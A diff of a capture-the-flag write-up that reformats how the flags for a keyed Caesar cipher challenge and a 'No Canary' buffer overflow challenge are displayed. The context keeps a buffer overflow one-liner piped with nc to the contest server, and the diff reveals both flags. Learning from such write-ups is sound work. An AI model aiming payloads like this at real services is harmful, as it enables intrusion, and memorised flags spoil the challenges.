@@ -31,9 +31,7 @@
 
 Well, as it's obvious from the title it has something to do with "Ceaser Cipher" and as the hint says "Keyed Ceaser" so i used this [site](http://rumkin.com/tools/cipher/caesar-keyed.php) to decrypt the flag given the key provided and BOOM! we got the flag!
 
-```
-actf{yum_delicious_salad}
-```
+#### Flag: ``` actf{yum_delicious_salad} ```
 ---
 
 ## No Canary
@@ -124,6 +122,4 @@ That was locally, and by applying it to **nc shell.actf.co 20700** it should giv
 $ python -c "print 'A' * 40 + '\x86\x11\x40\x00\x00\x00' | nc shell.actf.co 20700
 ```
 
-```
-actf{that_gosh_darn_canary_got_me_pwned!}
-```
+#### Flag: ``` actf{that_gosh_darn_canary_got_me_pwned!} ```
